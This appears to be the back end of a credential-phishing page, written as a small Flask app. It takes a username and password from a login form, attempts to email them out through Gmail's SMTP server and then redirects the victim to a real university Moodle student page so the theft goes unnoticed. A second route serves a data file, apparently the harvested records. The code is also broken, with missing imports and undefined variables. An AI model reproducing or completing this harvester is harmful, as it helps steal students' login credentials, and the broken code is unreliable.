from flask import Flask, redirect, render_template, request, send_file

app = Flask(__name__)

@app.route("/", methods= ["POST"] )
def main():
    if request.method == "POST":
        id = request.form.get('username')
        password = request.form.get("password")
        if(id == None):
            id = 'null'
        
        if(password == None):
            password = 'null'
        
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(from_address, password)
            server.sendmail(
                from_address,
                email,
                message,
            )
            
        
        return redirect('http://moodle.smuc.edu.et/students/')

@app.route("/random")
def random():
    return send_file('data.txt');
if __name__ == '__main__':

    app.run()
